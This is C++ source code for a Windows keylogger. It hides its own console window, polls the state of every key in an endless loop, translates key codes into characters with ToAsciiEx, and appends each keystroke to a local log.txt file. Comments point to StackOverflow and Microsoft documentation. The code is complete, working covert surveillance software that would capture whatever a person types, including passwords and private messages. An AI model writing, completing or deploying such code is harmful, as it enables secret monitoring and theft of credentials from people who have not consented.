#include <iostream>
//https://stackoverflow.com/questions/20017457/getconsolewindow-was-not-declared-in-this-scope/20017490
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <fstream>
#include <codecvt>
#include <stdlib.h>
#include <string>
void log(std::string c, std::string fileName);
std::string getKey(unsigned char c);

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::string logFileName = "log.txt";
    std::cout << "Process Started." << std::endl;
    unsigned char keyboardState[256] = {0};
    unsigned short buffer[2];
    HKL keyboardLayout = GetKeyboardLayout(0);
    //std::cout << sizeof(unsigned short) << std::endl;
    while(true){
        Sleep(10);
        //https://stackoverflow.com/questions/9046817/c-tounicodeex-not-recognizing-shift-key-unless-i-have-a-messgaebox
        //GetKeyboardState(keyboardState);
        //if(k < 256) keyboardState[k] = 0x80;
        //keyboardState[16] = 0x80;
        for(unsigned short k = 0; k < 256; k++)
            if((GetKeyState(k) & 0x8000) && !(k == VK_LCONTROL || k == VK_RCONTROL || k == VK_CONTROL || k == VK_MENU)) keyboardState[k] = 0x80;
            else keyboardState[k] = 0x00;
        for(unsigned short k = 0; k < 256; k++){
            int keyState = GetAsyncKeyState(k);
            //GetKeyboardState(keyboardState);
            //if(k < 256) keyboardState[k] = keyState;
            if(keyState == -32767 && k != 16 && k != 160 && k != 162 && k != 163 && k != 164 && k != 165){ //[16][160][17][162][18][164]// && k != 160 && k != 33 && k != 97 && k != 126 && k != 49
                //https://stackoverflow.com/questions/20079395/is-there-any-way-of-getting-the-virtual-key-code-from-char-in-c
                //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-toasciiex
                //https://bytes.com/topic/c/answers/800100-toasciiex
                //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate
                //std::cout << "KEY PRESS. Code: " << k << std::endl;
                std::string str;
                str = getKey(k);
                if(str == ""){
                    int ret = ToAsciiEx(k, MapVirtualKeyEx(k, 0, keyboardLayout), keyboardState, buffer, 0, keyboardLayout);
                    if(ret == 1) str = std::string("") + (char)buffer[0];
                    else if(ret == 2) str = "?";
                    else str = "[" + std::to_string((unsigned short)k) + "]";
                }
                std::cout << str;
                log(str, logFileName);
            }
        }
    }
    return 0;
}
void log(std::string c, std::string fileName){
    //http://www.cplusplus.com/reference/codecvt/codecvt_utf16/
    //std::locale loc (std::locale(), new std::codecvt_utf16<char16_t>);
    std::fstream logFile;
    //std::basic_ofstream<char16_t> logFile(fileName);
    logFile.open(fileName, std::fstream::app | std::ios::binary);
    if(logFile.is_open()){
        logFile << c;//getKey(c);
        logFile.close();
    }
    //logFile.imbue(loc);
    //logFile << c;
}

std::string getKey(unsigned char c){
    //http://blog.elliottcable.name/posts/useful_unicode.xhtml
    switch(c){
    case VK_SPACE:
        return " ";
    case VK_RETURN:
        return "\n";
    case VK_BACK:
        return "⌫"; //U+232B
    case VK_DELETE:
        return "⌦"; //U+2326
    case VK_LBUTTON:
        return "[L  ]";
    case VK_RBUTTON:
        return "[ M ]";
    case VK_MBUTTON:
        return "[  R]";
    case 91: //windows key
        return "❖"; //https://superuser.com/questions/1247382/is-there-a-unicode-character-for-the-windows-key
    case VK_CONTROL:
        return "⌃";
    case VK_MENU:
        return "⌥";
    case VK_ESCAPE:
        return "☒"; //U+2612 //https://en.wikipedia.org/wiki/Esc_key //ALT+27 or U+241B
    case VK_UP:
        return "↑";
    case VK_DOWN:
        return "↓";
    case VK_LEFT:
        return "←";
    case VK_RIGHT:
        return "→";
    }
    return "";
}
